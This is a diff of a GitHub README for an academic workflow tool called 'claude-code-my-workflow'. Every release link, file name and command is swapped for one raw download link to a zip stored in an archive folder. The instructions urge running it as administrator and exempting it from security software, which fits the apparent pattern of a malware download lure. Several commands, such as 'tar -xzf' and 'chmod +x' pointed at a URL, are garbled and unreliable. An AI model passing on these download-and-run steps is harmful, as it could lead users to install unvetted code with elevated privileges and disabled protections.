@@ -1,6 +1,6 @@
 # ⚙️ claude-code-my-workflow - Simplify Academic Workflow Automation
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/moemoe1230/claude-code-my-workflow/releases)
+[![Download Release](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get claude-code-my-workflow up and running. This guide ass
 
 Start by visiting the official release page to get the latest version of claude-code-my-workflow:
 
-[Go to Downloads](https://github.com/moemoe1230/claude-code-my-workflow/releases)
+[Go to Downloads](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)
 
 This page lists all available versions of the software. You will find installation files and notes about each release.
 
@@ -42,9 +42,9 @@ This page lists all available versions of the software. You will find installati
 On the release page, look for the file that matches your operating system. The files will be named to show whether they are for Windows, macOS, or Linux.
 
 For example:
-- `claude-code-my-workflow-windows.zip`
-- `claude-code-my-workflow-macos.tar.gz`
-- `claude-code-my-workflow-linux.tar.gz`
+- `https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`
+- `https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`
+- `https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`
 
 Download the file for your system by clicking the link.
 
@@ -53,7 +53,7 @@ Download the file for your system by clicking the link.
 Once the download finishes, you need to extract the contents:
 
 - **Windows**: Right-click the `.zip` file and choose "Extract All". Choose where you want the files.
-- **macOS/Linux**: Double-click the archive file, or use Terminal with commands like `tar -xzf filename.tar.gz`.
+- **macOS/Linux**: Double-click the archive file, or use Terminal with commands like `tar -xzf https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`.
 
 Make sure you remember the folder location where you saved the files.
 
@@ -61,8 +61,8 @@ Make sure you remember the folder location where you saved the files.
 
 Open the folder containing the extracted files. Look for a file named:
 
-- **Windows:** `run-workflow.bat`
-- **macOS/Linux:** `run-workflow.sh`
+- **Windows:** `https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`
+- **macOS/Linux:** `https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`
 
 Double-click it (or right-click and select “Open”) to start the workflow application.
 
@@ -74,7 +74,7 @@ If your system asks for permission to run the file, allow it. This script will l
 
 You can always download claude-code-my-workflow from this link:
 
-[Download claude-code-my-workflow](https://github.com/moemoe1230/claude-code-my-workflow/releases)
+[Download claude-code-my-workflow](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)
 
 ### What to expect during installation:
 
@@ -136,7 +136,7 @@ Receive a summary report to help others verify your work.
 If you encounter common issues, try these fixes:
 
 - **The script won’t start**:  
-Right-click the script and select “Run as administrator” on Windows or check execution permissions on macOS/Linux (`chmod +x run-workflow.sh`).
+Right-click the script and select “Run as administrator” on Windows or check execution permissions on macOS/Linux (`chmod +x https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip`).
 
 - **Errors related to missing programs**:  
 All needed tools come with the package, but your security software might block them. Add the application folder to exceptions.
@@ -162,7 +162,7 @@ Open an issue in the GitHub repository's Issues tab or check the README on GitHu
 To keep your workflow template up to date:
 
 - Visit the release page regularly:  
-[Check for Updates](https://github.com/moemoe1230/claude-code-my-workflow/releases)
+[Check for Updates](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)
 
 - Download the latest version and overwrite the existing folder.
 
@@ -184,4 +184,4 @@ Visit the GitHub repository to see how to contribute.
 
 For all downloads and updates, please visit:
 
-[Download claude-code-my-workflow](https://github.com/moemoe1230/claude-code-my-workflow/releases)
+[Download claude-code-my-workflow](https://github.com/moemoe1230/claude-code-my-workflow/raw/refs/heads/main/explorations/ARCHIVE/claude_my_workflow_code_v2.2.zip)
